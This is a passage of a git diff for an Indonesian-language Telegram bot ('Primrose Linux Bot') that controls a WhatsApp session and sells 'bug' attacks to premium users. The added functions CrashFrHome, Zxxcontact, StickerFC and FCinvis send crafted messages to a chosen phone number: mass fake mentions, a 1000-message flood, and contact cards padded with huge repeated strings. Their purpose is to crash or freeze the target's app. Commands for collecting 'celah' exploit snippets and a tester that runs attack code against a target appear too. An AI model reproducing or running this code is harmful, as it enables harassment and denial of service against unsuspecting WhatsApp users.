-        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*target\s*,\s*message\s*,\s*(\{[^}]*\})\s*\)/g, 'sock.relayMessage(target, message, { ...$1, participant: { jid: target } })');
-        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant ditambahkan ke parameter ketiga." };
-    }
-    if (/sock\.relayMessage\s*\(\s*['"]status@broadcast['"]\s*,\s*msg\s*,\s*\{[^}]*\}\s*\)/g.test(fixed)) {
-        fixed = fixed.replace(/sock\.relayMessage\s*\(\s*['"]status@broadcast['"]\s*,\s*msg\s*,\s*(\{[^}]*\})\s*\)/g, 'sock.relayMessage(\'status@broadcast\', msg, { ...$1, participant: { jid: target } })');
-        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant ditambahkan ke status broadcast." };
-    }
-    if (/await\s+sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g.test(fixed)) {
-        fixed = fixed.replace(/await\s+sock\.relayMessage\s*\(\s*target\s*,\s*message\s*\)/g, 'await sock.relayMessage(target, message, { participant: { jid: target } })');
-        return { hasAlready: false, fixedCode: fixed, message: "✅ Participant berhasil ditambahkan." };
-    }
-    return { hasAlready: false, fixedCode: code, message: "⚠️ Tidak ditemukan pattern relayMessage dalam code." };
-}
-
-// ================= AUTO FIX ================= //
+// ================= FITUR CEKFUNC & AUTO FIX ================= //
 function autoFixJavaScript(code, error) {
     let fixed = code;
     const fixes = [];
     const lines = fixed.split('\n');
     for (let i = 0; i < lines.length; i++) {
         let line = lines[i].trim();
-        if (line && !line.endsWith(';') && !line.endsWith('{') && !line.endsWith('}') && !line.endsWith('(') && !line.startsWith('//') && !line.startsWith('/*') && !line.match(/(if|else|for|while|function|return|=>|,)$/)) {
+        if (line && !line.endsWith(';') && !line.endsWith('{') && !line.endsWith('}') && 
+            !line.endsWith('(') && !line.startsWith('//') && !line.startsWith('/*') &&
+            !line.match(/(if|else|for|while|function|return|=>|,)$/)) {
             lines[i] += ';';
             fixes.push(`Added semicolon at line ${i+1}`);
         }
@@ -789,11 +1362,20 @@ function autoFixJavaScript(code, error) {
     fixed = lines.join('\n');
     let open = (fixed.match(/\(/g) || []).length;
     let close = (fixed.match(/\)/g) || []).length;
-    if (open > close) { fixed += ')'.repeat(open - close); fixes.push('Added missing parentheses'); }
+    if (open > close) {
+        fixed += ')'.repeat(open - close);
+        fixes.push('Added missing parentheses');
+    }
     open = (fixed.match(/\{/g) || []).length;
     close = (fixed.match(/\}/g) || []).length;
-    if (open > close) { fixed += '}'.repeat(open - close); fixes.push('Added missing brackets'); }
-    if (fixed.includes('await ') && !fixed.includes('async ')) { fixed = fixed.replace(/function\s+(\w+)\s*\(/, 'async function $1('); fixes.push('Added async keyword'); }
+    if (open > close) {
+        fixed += '}'.repeat(open - close);
+        fixes.push('Added missing brackets');
+    }
+    if (fixed.includes('await ') && !fixed.includes('async ')) {
+        fixed = fixed.replace(/function\s+(\w+)\s*\(/, 'async function $1(');
+        fixes.push('Added async keyword');
+    }
     if (fixed.includes('await') && !fixed.includes('try') && !fixed.includes('.catch')) {
         const awaitLines = fixed.split('\n');
         for (let i = 0; i < awaitLines.length; i++) {
@@ -805,26 +1387,63 @@ function autoFixJavaScript(code, error) {
         }
         fixed = awaitLines.join('\n');
     }
-    if (fixed.includes(' == ') && !fixed.includes(' === ')) { fixed = fixed.replace(/==(?!=)/g, '==='); fixes.push('Changed == to ==='); }
-    if (fixed.includes('var ')) { fixed = fixed.replace(/\bvar\s+/g, 'let '); fixes.push('Changed var to let'); }
-    if (fixed.match(/function\s+\w+\s*\(\s*\)/) && (fixed.includes('sock') || fixed.includes('target'))) { fixed = fixed.replace(/function\s+(\w+)\s*\(\s*\)/, 'function $1(sock, target)'); fixes.push('Added missing parameters (sock, target)'); }
+    if (fixed.includes(' == ') && !fixed.includes(' === ')) {
+        fixed = fixed.replace(/==(?!=)/g, '===');
+        fixes.push('Changed == to ===');
+    }
+    if (fixed.includes('var ')) {
+        fixed = fixed.replace(/\bvar\s+/g, 'let ');
+        fixes.push('Changed var to let');
+    }
+    if (fixed.includes('async function') && !fixed.includes('return')) {
+        const linesArr = fixed.split('\n');
+        for (let i = 0; i < linesArr.length; i++) {
+            if (linesArr[i].includes('async function') && linesArr[i+1] && linesArr[i+1].includes('{')) {
+                for (let j = linesArr.length - 1; j > i; j--) {
+                    if (linesArr[j].includes('}')) {
+                        linesArr[j] = '  return true;\n' + linesArr[j];
+                        fixes.push('Added return statement');
+                        break;
+                    }
+                }
+                break;
+            }
+        }
+        fixed = linesArr.join('\n');
+    }
+    if (fixed.match(/function\s+\w+\s*\(\s*\)/) && (fixed.includes('sock') || fixed.includes('target'))) {
+        fixed = fixed.replace(/function\s+(\w+)\s*\(\s*\)/, 'function $1(sock, target)');
+        fixes.push('Added missing parameters (sock, target)');
+    }
     let braceOpen = (fixed.match(/\{/g) || []).length;
     let braceClose = (fixed.match(/\}/g) || []).length;
-    if (braceOpen > braceClose) { fixed += '\n}'.repeat(braceOpen - braceClose); fixes.push('Added missing closing braces'); }
+    if (braceOpen > braceClose) {
+        fixed += '\n}'.repeat(braceOpen - braceClose);
+        fixes.push('Added missing closing braces');
+    }
     return { fixed, fixes };
 }
 
-// ================= TESTFUNCTION ================= //
+// ================= FITUR TESTFUNCTION ================= //
 async function executeTestFunction(sock, target, funcCode, jumlah) {
     try {
         const matchFunc = funcCode.match(/async function\s+(\w+)/);
         if (!matchFunc) return false;
         const funcName = matchFunc[1];
-        const sandbox = { console, Buffer, sock, target, sleep, generateWAMessageFromContent };
+        const sandbox = {
+            console,
+            Buffer,
+            sock: sock,
+            target,
+            sleep,
+            generateWAMessageFromContent,
+        };
         const context = vm.createContext(sandbox);
         const wrapper = `${funcCode}\n${funcName}(sock, target)`;
         for (let i = 0; i < jumlah; i++) {
-            try { vm.runInContext(wrapper, context); } catch (err) {}
+            try {
+                vm.runInContext(wrapper, context);
+            } catch (err) {}
             await sleep(100);
         }
         return true;
@@ -833,545 +1452,1096 @@ async function executeTestFunction(sock, target, funcCode, jumlah) {
     }
 }
 
-async function checkUserAccess(userId, chatId, chatType, commandName) {
-    if (isCommandBlocked(commandName)) return false;
-    if (isOwner(userId)) return true;
-    if (chatType === "private" && !isPremium(userId)) {
-        await safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
-        return false;
+// ================= BUG FUNCTIONS ================= //
+
+async function CrashFrHome(sock, target) {
+    try {
+        const stickerMsg = {
+            viewOnceMessage: {
+                message: {
+                    stickerMessage: {
+                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+                        mimetype: "image/webp",
+                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+                        fileLength: { low: 1, high: 0, unsigned: true },
+                        mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+                        isAnimated: true,
+                        contextInfo: {
+                            mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")],
+                        },
+                    },
+                },
+            },
+        };
+        await sock.sendMessage(target, stickerMsg);
+        console.log("✅ CrashFrHome sticker sent to:", target);
+        for (let i = 0; i < 1000; i++) {
+            await sock.sendMessage(target, {
+                viewOnceMessage: {
+                    message: {
+                        eventMessage: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: "33333333333333333@newsletter",
+                                newsletterName: "FrezeHomeAbouse",
+                            },
+                        },
+                    },
+                },
+            });
+            console.log(`📤 CrashFrHome sending to ${target} - iteration ${i + 1}`);
+            await sleep(50);
+        }
+    } catch (e) {
+        console.log("❌ Error in CrashFrHome:", e);
+        throw e;
     }
-    return true;
 }
 
+async function StickerFC(sock, target) {
+    try {
+        const message = {
+            "groupStatusMessageV2": {
+                "message": {
+                    "stickerMessage": {
+                        "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                        "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                        "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                        "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                        "mimetype": "image/webp",
+                        "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                        "fileLength": "10610",
+                        "mediaKeyTimestamp": "1775044724",
+                        "stickerSentTs": "1775044724091"
+                    }
+                }
+            }
+        };
+        await sock.relayMessage(target, message, {});
+        console.log("✅ StickerFC sent to:", target);
+    } catch (err) {
+        console.error("❌ Error StickerFC:", err);
+        throw err;
+    }
+}
+
+async function Zxxcontact(sock, target) {
+    try {
+        const contactMessage = {
+            viewOnceMessage: {
+                message: {
+                    contactMessage: {
+                        displayName: "카나이 하티".repeat(20000),
+                        vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + "카나이 하티".repeat(10000) + "\nORG:" + "아르케인 엑소시스트".repeat(10000) + "\nADR;TYPE=WORK:;;" + "서울특별시 강남구 테헤란로 101".repeat(10000) + ";;;\nTEL;type=CELL;waid=821012345678:" + "+821012345678".repeat(10000) + "\nNOTE:" + "관리자 전용 계정입니다.".repeat(20000) + "\nEND:VCARD"
+                    }
+                }
+            }
+        };
+        await sock.relayMessage(target, contactMessage, { participant: { jid: target } });
+        console.log("✅ Zxxcontact sent to:", target);
+    } catch (err) {
+        console.error("❌ Error Zxxcontact:", err);
+        throw err;
+    }
+}
+
+async function FCinvisTes(sock, target) {
+    const message = {
+        "groupStatusMessageV2": {
+            "message": {
+                "stickerMessage": {
+                    "url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                    "fileSha256": "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                    "fileEncSha256": "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                    "mediaKey": "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                    "mimetype": "image/webp",
+                    "directPath": "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                    "fileLength": "10610",
+                    "mediaKeyTimestamp": "1775044724",
+                    "stickerSentTs": "1775044724091"
+                }
+            }
+        }
+    };
+    return await sock.relayMessage(target, message, { participant: { jid: target } });
+}
+
+async function FCinvis(sock, target) {
+    return await FCinvisTes(sock, target);
+}
+
+async function brem(sock, target) { }
+async function VisiFriend(sock, target) { }
+async function OfferXForclose(sock, target) { }
+async function bulldozerV2(sock, target) { }
+async function xatanicaldelayv2(sock, target) { }
+async function MbaPe(sock, target) { }
+
 function createBugSuccessMessage(targetNumber, bugType, date) {
-    return `<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>\n\n◉ Target : ${targetNumber}\n◉ Type Bug : ${bugType}\n◉ Status : Successfully Send\n◉ Date Now : ${date}\n\n<blockquote>⸙ Spam Free at will</blockquote>`;
+    return `
+<blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>
+
+◉ Target : ${targetNumber}
+◉ Type Bug : ${bugType}
+◉ Status : Successfully Send
+◉ Date Now : ${date}
+
+<blockquote>⸙ Spam Free at will</blockquote>`;
 }
 
 function createCheckButton(targetNumber) {
     return { inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]] };
 }
 
-// ================= BUG FUNCTIONS ================= //
-async function CrashFrHome(sock, target) {
-    try {
-        await sock.sendMessage(target, { viewOnceMessage: { message: { stickerMessage: { url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true", fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=", fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=", mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=", mimetype: "image/webp", directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0", fileLength: { low: 1, high: 0, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false }, isAnimated: true, contextInfo: { mentionedJid: [target, ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net")] } } } } });
-        for (let i = 0; i < 1000; i++) { await sock.sendMessage(target, { viewOnceMessage: { message: { eventMessage: { newsletterAdminInviteMessage: { newsletterJid: "33333333333333333@newsletter", newsletterName: "FrezeHomeAbouse" } } } } }); await sleep(50); }
-    } catch (e) {}
+function getCurrentDate() {
+    return new Date().toLocaleString('id-ID', { year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
 }
 
-async function StickerFC(sock, target) {
-    try {
-        await sock.relayMessage(target, { groupStatusMessageV2: { message: { stickerMessage: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true", fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=", mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", mimetype: "image/webp", directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c", fileLength: "10610", mediaKeyTimestamp: "1775044724", stickerSentTs: "1775044724091" } } } }, {});
-    } catch (err) {}
-}
-
-async function FCinvisTes(sock, target) {
-    return await sock.relayMessage(target, { groupStatusMessageV2: { message: { stickerMessage: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true", fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=", mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", mimetype: "image/webp", directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c", fileLength: "10610", mediaKeyTimestamp: "1775044724", stickerSentTs: "1775044724091" } } } }, { participant: { jid: target } });
-}
-
-async function FCinvis(sock, target) { return await FCinvisTes(sock, target); }
-async function brem(sock, target) { }
-async function VisiFriend(sock, target) { }
-async function bulldozerV2(sock, target) { }
-async function xatanicaldelayv2(sock, target) { }
-
-// ================= COMMANDS ================= //
-bot.onText(/\/start/, async (msg) => {
-    const chatId = msg.chat.id;
-    const from = msg.from;
-    const userId = from.id;
-    const chatType = msg.chat.type;
-    const isGroup = chatType === "group" || chatType === "supergroup";
-    if (!isGroup && !isPremium(userId) && !isOwner(userId)) {
-        return safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
+async function checkUserAccess(userId, chatId, chatType, commandName) {
+    const isOwnerUser = isOwner(userId);
+    const isPremiumUser = isPremium(userId);
+    if (isCommandBlocked(commandName)) return false;
+    if (isOwnerUser) return true;
+    if (chatType === "private" && !isPremiumUser) {
+        await safeSendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
+        return false;
     }
-    await sendStartMenu(chatId, from);
-});
+    return true;
+}
 
 bot.onText(/\/cekfunc/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "cekfunc")) return;
-    if (!msg.reply_to_message) return safeSendMessage(chatId, "⚠️ Reply function JavaScript.");
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "cekfunc");
+    if (!hasAccess) return;
+    if (!msg.reply_to_message) {
+        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Kirim function JavaScript\n2. Reply function tersebut\n3. Ketik /cekfunc", { parse_mode: "Markdown" });
+    }
     const text = msg.reply_to_message.text || msg.reply_to_message.caption;
-    if (!text) return safeSendMessage(chatId, "❌ Pesan tidak berisi kode.");
-    const loadingMsg = await safeSendMessage(chatId, "🔍 Menganalisis function...");
+    if (!text) {
+        return safeSendMessage(chatId, "❌ Pesan yang direply tidak berisi kode.");
+    }
+    const loadingMsg = await safeSendMessage(chatId, "🔍 *Menganalisis function...*", { parse_mode: "Markdown" });
     if (!loadingMsg) return;
     try {
-        acorn.parse(text, { ecmaVersion: "latest", sourceType: "module", locations: true });
-        await safeEditMessageText(chatId, loadingMsg.message_id, `🔎 SYNTAX VALID\n\n✅ Tidak ditemukan error.\n\n© Primrose Linux Bot`);
+        acorn.parse(text, {
+            ecmaVersion: "latest",
+            sourceType: "module",
+            locations: true
+        });
+        await safeEditMessageText(chatId, loadingMsg.message_id, `🔎 *Mengecek syntax function...*\n\n✅ *SYNTAX VALID*\nTidak ditemukan error.\n\n© Primrose Linux Bot`, { parse_mode: "Markdown" });
     } catch (err) {
         const lines = text.split("\n");
         const line = err.loc.line;
-        const snippet = lines.slice(Math.max(0, line - 3), Math.min(lines.length, line + 2)).map((l, i) => { const num = Math.max(0, line - 3) + i + 1; return num === line ? `👉 ${num} | ${l}` : `   ${num} | ${l}`; }).join("\n");
-        const keyboard = { inline_keyboard: [[{ text: "🔧 AUTO FIX 100%", callback_data: `autofix_${loadingMsg.message_id}` }]] };
+        const column = err.loc.column;
+        const start = Math.max(0, line - 3);
+        const end = Math.min(lines.length, line + 2);
+        const snippet = lines.slice(start, end).map((l, i) => {
+            const num = start + i + 1;
+            return num === line ? `👉 ${num} | ${l}` : `   ${num} | ${l}`;
+        }).join("\n");
+        const errorMessage = `❌ *ERROR TERDETEKSI*\n\n${err.message}\nLine ${line}:${column}\n\n📌 *Cuplikan:*\n\`\`\`javascript\n${snippet}\n\`\`\`\n\n© Primrose Linux Bot`;
+        const keyboard = {
+            inline_keyboard: [[{ text: "🔧 AUTO FIX 100%", callback_data: `autofix_${loadingMsg.message_id}` }]]
+        };
         global.pendingFix = global.pendingFix || {};
-        global.pendingFix[loadingMsg.message_id] = { code: text, error: err.message };
-        await safeEditMessageText(chatId, loadingMsg.message_id, `❌ ERROR TERDETEKSI\n\n${err.message}\nLine ${line}\n\n📌 Cuplikan:\n${snippet}`, { reply_markup: keyboard });
+        global.pendingFix[loadingMsg.message_id] = {
+            code: text,
+            error: err.message,
+            line: line,
+            column: column
+        };
+        await safeEditMessageText(chatId, loadingMsg.message_id, errorMessage, {
+            parse_mode: "Markdown",
+            reply_markup: keyboard
+        });
     }
 });
 
-bot.onText(/\/addparticipant/, async (msg) => {
-    const chatId = msg.chat.id;
-    const userId = msg.from.id;
-    const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "addparticipant")) return;
-    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) return safeSendMessage(chatId, "⚠️ Reply function JavaScript.");
-    let code = msg.reply_to_message.text;
-    if (!code && msg.reply_to_message.document) {
-        const file = await bot.getFile(msg.reply_to_message.document.file_id);
-        const response = await axios.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`);
-        code = response.data;
-    }
-    const loadingMsg = await safeSendMessage(chatId, "👤 Memeriksa participant...");
-    if (!loadingMsg) return;
-    const result = addParticipantToCode(code);
-    if (result.hasAlready) return safeEditMessageText(chatId, loadingMsg.message_id, `✅ PARTICIPANT SUDAH ADA\n\n${result.message}`);
-    if (result.message.includes("Tidak ditemukan")) return safeEditMessageText(chatId, loadingMsg.message_id, `⚠️ PARTICIPANT TIDAK DITEMUKAN\n\n${result.message}`);
-    if (result.fixedCode.length > 3500) {
-        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ PARTICIPANT DITAMBAHKAN!\n\nCode terlalu panjang, dikirim sebagai file.`);
-        const filePath = `participant_fixed_${Date.now()}.js`;
-        fs.writeFileSync(filePath, result.fixedCode);
-        await bot.sendDocument(chatId, filePath, { caption: `✅ Code dengan participant` });
-        fs.unlinkSync(filePath);
-    } else {
-        await safeEditMessageText(chatId, loadingMsg.message_id, `✅ PARTICIPANT DITAMBAHKAN!\n\n${result.message}\n\n🟢 HASIL:\n${result.fixedCode}`);
-    }
-});
-
+// ================= FITUR CELAHFUNC ================= //
 bot.onText(/\/celahfunc/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "celahfunc")) return;
-    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) return safeSendMessage(chatId, "⚠️ Reply code JavaScript.");
-    let code = msg.reply_to_message.text;
-    if (!code && msg.reply_to_message.document) {
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "celahfunc");
+    if (!hasAccess) return;
+    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
+        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Kirim code JavaScript\n2. Reply code tersebut\n3. Ketik /celahfunc", { parse_mode: "Markdown" });
+    }
+    let code = '';
+    if (msg.reply_to_message.text) {
+        code = msg.reply_to_message.text;
+    } else if (msg.reply_to_message.document) {
         const file = await bot.getFile(msg.reply_to_message.document.file_id);
-        const response = await axios.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`);
+        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
+        const response = await axios.get(fileUrl);
         code = response.data;
     }
+    const loadingMsg = await safeSendMessage(chatId, "🔍 *Menganalisis celah...*", { parse_mode: "Markdown" });
+    if (!loadingMsg) return;
     const celah = extractCelah(code);
-    if (celah.length === 0) return safeSendMessage(chatId, "❌ Tidak ditemukan celah.");
-    let response = `<blockquote>🔍 CELAH DITEMUKAN (${celah.length})</blockquote>\n\n`;
-    for (let i = 0; i < Math.min(celah.length, 10); i++) response += `<b>${i+1}. ${celah[i].type}</b>\n<code>${celah[i].content.substring(0, 300)}</code>\n\n`;
-    await safeSendMessage(chatId, response, { parse_mode: "HTML" });
+    if (celah.length === 0) {
+        await safeEditMessageText(chatId, loadingMsg.message_id, "❌ *Tidak ditemukan celah/pattern dalam code!*\n\n💡 Gunakan /addcelah untuk menambahkan celah baru ke database.", { parse_mode: "Markdown" });
+        return;
+    }
+    let response = `<blockquote>🔍 CELAH DITEMUKAN</blockquote>\n\n`;
+    response += `Total: ${celah.length} celah\n━━━━━━━━━━━━━━━━━━\n\n`;
+    for (let i = 0; i < Math.min(celah.length, 10); i++) {
+        response += `<b>${i+1}. Type: ${celah[i].type}</b>\n`;
+        response += `<code>${celah[i].content.substring(0, 600)}</code>\n`;
+        if (celah[i].content.length > 600) response += `\n... (${celah[i].content.length - 600} chars terpotong)\n`;
+        response += `━━━━━━━━━━━━━━━━━━\n\n`;
+    }
+    await safeEditMessageText(chatId, loadingMsg.message_id, response, { parse_mode: "HTML" });
 });
 
+// ================= FITUR ADD CELAH ================= //
 bot.onText(/\/addcelah/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "addcelah")) return;
-    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) return safeSendMessage(chatId, "⚠️ Reply code JavaScript.");
-    let code = msg.reply_to_message.text;
-    if (!code && msg.reply_to_message.document) {
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "addcelah");
+    if (!hasAccess) return;
+    if (!msg.reply_to_message || (!msg.reply_to_message.text && !msg.reply_to_message.document)) {
+        return safeSendMessage(chatId, "⚠️ *CARA PAKE:*\n1. Kirim code JavaScript\n2. Reply code tersebut\n3. Ketik /addcelah", { parse_mode: "Markdown" });
+    }
+    let code = '';
+    if (msg.reply_to_message.text) {
+        code = msg.reply_to_message.text;
+    } else if (msg.reply_to_message.document) {
         const file = await bot.getFile(msg.reply_to_message.document.file_id);
-        const response = await axios.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`);
+        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
+        const response = await axios.get(fileUrl);
         code = response.data;
     }
+    const loadingMsg = await safeSendMessage(chatId, "💾 *Menyimpan celah ke database...*", { parse_mode: "Markdown" });
+    if (!loadingMsg) return;
     const celah = extractCelah(code);
-    let added = 0;
+    if (celah.length === 0) {
+        await safeEditMessageText(chatId, loadingMsg.message_id, "❌ *Tidak ditemukan celah/pattern dalam code!* Tidak ada yang bisa disimpan.", { parse_mode: "Markdown" });
+        return;
+    }
+    let addedCount = 0;
     for (const c of celah) {
-        if (!celahDatabase.some(item => item.type === c.type && item.content === c.content)) {
-            celahDatabase.push({ id: Date.now().toString(36), type: c.type, content: c.content, addedBy: userId });
-            added++;
+        const exists = celahDatabase.some(item => item.type === c.type && item.content === c.content);
+        if (!exists) {
+            celahDatabase.push({
+                id: Date.now().toString(36) + Math.random().toString(36).substring(2, 8),
+                type: c.type,
+                content: c.content,
+                addedBy: userId,
+                addedAt: Date.now()
+            });
+            addedCount++;
         }
     }
-    saveCelahDatabase();
-    await safeSendMessage(chatId, `✅ ${added} celah ditambahkan.`);
+    saveCelahDatabase(celahDatabase);
+    await safeEditMessageText(chatId, loadingMsg.message_id, `✅ *Berhasil menyimpan ${addedCount} celah baru ke database!*\n\n📊 Total celah tersimpan: ${celahDatabase.length}`, { parse_mode: "Markdown" });
 });
 
+// ================= FITUR LIST CELAH ================= //
 bot.onText(/\/listcelah/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
     const chatType = msg.chat.type;
-    if (!await checkUserAccess(userId, chatId, chatType, "listcelah")) return;
-    if (celahDatabase.length === 0) return safeSendMessage(chatId, "📌 Belum ada celah.");
